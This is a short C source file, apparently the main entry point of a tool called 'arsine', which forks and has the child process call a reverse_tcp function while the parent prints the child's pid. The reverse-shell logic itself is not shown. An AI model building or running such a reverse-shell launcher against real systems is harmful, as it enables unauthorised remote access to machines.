#include "header.h"

/**
 * main - entry point
 * 
 * Return: 0
 */
int main(void)
{
	pid_t pid;
	arsine_t arsine;

	arsine_init(&arsine);

    pid = fork();

	if (pid == 0)
		reverse_tcp(&arsine);
	else
		printf("child pid: %d\n", pid);

	return 0;
}
